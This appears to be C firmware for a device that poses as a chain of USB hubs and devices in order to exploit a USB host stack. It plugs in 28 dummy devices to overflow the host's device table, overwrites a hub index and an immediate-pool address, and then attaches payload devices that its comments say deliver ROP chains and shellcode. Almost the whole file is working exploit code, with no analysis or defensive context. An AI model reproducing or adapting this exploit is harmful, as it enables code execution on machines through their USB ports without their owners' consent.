#include <stdio.h>
#include <usb_device.h>

#include <usb_hub.h>
#include <usb_fake.h>
#include <usb_mem.h>
#include <usb_payload.h>
#include <constants.h>

#include <uart.h>

#define MEM_OW_ADDR         HUB_ARRAY_IMM_ADDR

static struct usb_device devices[USB_MAX_DEVICES];
static struct usb_device* rootdev = &devices[0];

static struct usb_device* make_device( void ) {
    static unsigned dev_idx = 1;
    if(dev_idx >= USB_MAX_DEVICES) {
        uart_print("Ran out of devices... Spinning.\n");
        while(1);
    }
    return &devices[dev_idx++];
}

void mem_overwrite(struct usb_device* hub) {

    // This ended up a little hacky.
    // Which payload gets sent depends on the payload->init ordering
    // The first payload device sends the overwrite of the immediate pool
    // The second payload device sends the actual ROP + shellcode

    // First payload (immediate pool)
    struct usb_device* payload = make_device();
    usb_payload_make_device(payload);
    payload->init(payload);
    usb_hub_add_device(hub, payload);

    // Single padding device
    struct usb_device* fake = make_device();
    usb_fake_make_device(fake);
    fake->init(fake);
    usb_hub_add_device(payload, fake);

    // Second payload (ROP + shellcode)
    struct usb_device* tmp = make_device(); 
    usb_payload_make_device(tmp);
    tmp->init(tmp);
    usb_hub_add_device(payload, tmp);
}

int main(void){
    usb_setup_hardware();
    uart_print("Hello world!\n");
    usb_hub_make_device(rootdev);
    rootdev->init(rootdev);
    /*  Plug in our dummy devices.
        We need 29, 29 + one for
        the root hub, one for this
        hub makes 31. The overflow
        device goes in slot 32. 
    }*/
    
    struct usb_device* fake = make_device();
    usb_fake_make_device(fake);
    fake->init(fake);

    for(int i = 0; i < 28; i++)
        usb_hub_add_device(rootdev, fake);
    
    struct usb_device* hub = make_device();
    usb_hub_make_device(hub);
    hub->init(hub);
    usb_hub_add_device(rootdev, hub);

    /* Create the mem overwrite device */
    struct usb_device* mem = make_device();
    usb_mem_make_device(mem);
    mem->init(mem);
    usb_mem_write_to(MEM_OW_ADDR);
    usb_hub_add_device(hub, mem);

    /* Same device does the hub_idx overwrite */
    usb_hub_add_device(hub, mem);

    /* Skip root hub */
    fake = make_device();  // Need a new device, otherwise we overwrite the parent.
    usb_fake_make_device(fake);
    fake->init(fake);

    usb_hub_add_device(hub, fake);

    mem_overwrite(hub);

    /* 'Plug in' the root device */
    usb_set_device(rootdev, 0);
    usb_init();

    while(1){
        usb_do();
    }
}
 
